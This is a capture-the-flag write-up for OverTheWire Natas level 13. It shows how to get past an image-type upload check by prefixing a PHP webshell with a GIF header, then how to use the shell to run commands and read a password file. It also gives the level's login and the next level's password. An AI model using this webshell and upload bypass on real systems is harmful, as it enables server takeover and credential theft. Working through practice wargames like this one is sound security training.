# [Level 12 to 13](https://overthewire.org/wargames/natas/natas13.html) - Exploit file upload: GIF Header

- Login
```
URL: http://natas13.natas.labs.overthewire.org
Username: natas13
Password: trbs5pCjCrkuSknBBKHhaBxq6Wm1j3LC
```
- Exercise:
![image](https://github.com/user-attachments/assets/fb568b6c-a4dd-4674-80a0-4224ddceb4a0)
![image](https://github.com/user-attachments/assets/4ab9e2cb-459a-4fb5-8db5-7d4ba7773d02)

- Background:
  - Uses `exif_imagetype()` to check if the uploaded file is an image or not
  - This PHP function reads the first few bytes of a file to determine the file type
    - Won’t be fooled by just changing the file extension
    - If the file does not begin with the header bytes that indicate it actually is an image file, it will be rejected
    - GIF start with this headers: `GIF87a`
- Solution:
  - Save as file.php: Prepend "GIF87a" to the start of the webshell
  ```php
  GIF87a<?php echo shell_exec($_GET['e'].' 2>&1'); ?>
  ```
  - Upload the file:
    - Website tries to change the file extension
    - To keep `.php`, open the Dev Tools and change the hidden file name
  ![image](https://github.com/user-attachments/assets/fc6dcc16-8861-4e41-8c8d-5ee8f5846fa3)
  - Click Upload file:
  ![image](https://github.com/user-attachments/assets/d5e520aa-77ef-4337-89f7-98b81bac8afc)
  ![image](https://github.com/user-attachments/assets/a811ae7c-046b-4e0c-b144-30c8fa48b21f)
  - Getting an error because it's expecting a query value and isn't getting one, provide `?e=ls` to see other webshells
  - Supply an input of `?e=cat%20/etc/natas_webpass/natas14` to the webshell to get the flag: `http://natas13.natas.labs.overthewire.org/upload/oazgfldi85.php?e=cat%20/etc/natas_webpass/natas14`
  ![image](https://github.com/user-attachments/assets/4ce00eaa-62c0-4a50-957c-548ad0f41829)
- Password: `z3UYcr4v4uBpeX8f7EZbMHlzK4UR2XtQ`
